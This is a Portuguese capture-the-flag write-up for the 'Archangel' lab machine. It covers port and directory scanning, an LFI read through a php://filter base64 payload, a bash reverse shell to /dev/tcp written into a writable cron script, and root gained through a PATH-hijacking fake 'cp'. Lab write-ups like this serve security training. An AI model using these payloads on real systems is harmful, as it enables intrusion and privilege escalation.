# Archangel
> ### Task2
* ### Scan de portas - Verificando quais portas estão abertas.

```Bash
rustscan -a 10.10.190.103
```
![image](https://github.com/lufffe/Writeups/assets/90646635/09f25182-3576-4a95-aa0d-9ad50849f2c1)

![image](https://github.com/lufffe/Writeups/assets/90646635/6903d907-73b0-44b2-9f2c-eecb0de8dc1f)

* ### Verificando o que está rodando nas portas encontradas.
```Bash
nmap -A -p 22,80 10.10.190.103
```

![image](https://github.com/lufffe/Writeups/assets/90646635/77f9c9b5-4d38-471f-8e50-52ce32e8e477)

* ### Aqui encontramos o hostname para colocar no arquivo hosts.
![image](https://github.com/lufffe/Writeups/assets/90646635/e93565f5-9954-48d3-b9c9-def0b80306be)

* ### Após colocar o hostname encontrado, no arquivos hosts, você já encontra a primeira flag.
![image](https://github.com/lufffe/Writeups/assets/90646635/38df4b9f-d28a-4bcd-93c8-009668cb657a)

### - Scan de Arquivos e Diretórios

```Bash
gobuster dir -u http://mafialive.thm -w common.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/acff1198-bf89-416c-9c2f-dab855959859)

### - Aqui você ver um LFI no parâmetro "view"
![image](https://github.com/lufffe/Writeups/assets/90646635/a776dd89-db9e-40dd-b581-a2559fe64040)

* ### Explorando LFI - com output em base64 no arquivo test.php
>view-source:http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
![image](https://github.com/lufffe/Writeups/assets/90646635/c047d6a4-b997-47fb-b79d-25aa73ca0f2f)

* ### E olhando na decodificação do Base64 encontra a segunda flag
![image](https://github.com/lufffe/Writeups/assets/90646635/4fbb238e-64dd-451a-9add-1f30be7c8f2d)

* ### Verificando no passwd o usuário.
![image](https://github.com/lufffe/Writeups/assets/90646635/05a7805d-28dc-46b2-9da0-5eec1a44fd4b)

* ### Pegando a flag user.txt
![image](https://github.com/lufffe/Writeups/assets/90646635/431c811b-32b7-49a0-9de5-7db4fcb7260b)

> ### Task3

* ### Criando um server para subir uma Reverse shell
```Bash
nc -lnvp 4455
```
![image](https://github.com/lufffe/Writeups/assets/90646635/063f5007-3303-4435-bf06-cc15de9f318c)

* ### Verificando arquivos que são do usuário archangel
```Bash
find / -user archangel 2>/dev/null
```
![image](https://github.com/lufffe/Writeups/assets/90646635/5733f952-a999-4c29-87bc-f68b8379e54e)

* ### Verificando permissões dos arquivos encontrados na pasta /opt/
```Bash
ls -la /opt/
```
![image](https://github.com/lufffe/Writeups/assets/90646635/f5a6b7ab-036f-4e2c-94b6-4a4ee6c8643e)

* ### Como temos permissão de escrita no arquivo helloworld.sh, joguei uma reverse para pegar shell com o usuário.
 ```Bash
echo "bash -c 'bash -i >& /dev/tcp/IP/9999 0>&1'" > /opt/helloworld.sh
 ```
![image](https://github.com/lufffe/Writeups/assets/90646635/5fd620d4-e61e-4243-b434-7d3a8e07e7e8)

* ### Aqui está a segunda flag user
![image](https://github.com/lufffe/Writeups/assets/90646635/b1a6b916-10c3-44c9-b640-0fe1f619f873)

* ### o arquivo backup usa o cp .
home/archangel/secret/backup

```bash
archangel@ubuntu:~/secret$ echo '/bin/bash -p' > cp
archangel@ubuntu:~/secret$ chmod 777 cp
archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH
archangel@ubuntu:~/secret$ echo $PATH
```

```bash
archangel@ubuntu:~/secret$ ./backup
```
![image](https://github.com/lufffe/Writeups/assets/90646635/868b4ead-c482-4b80-906d-95f1fe267045)

```bash
cat /root/root.txt
```
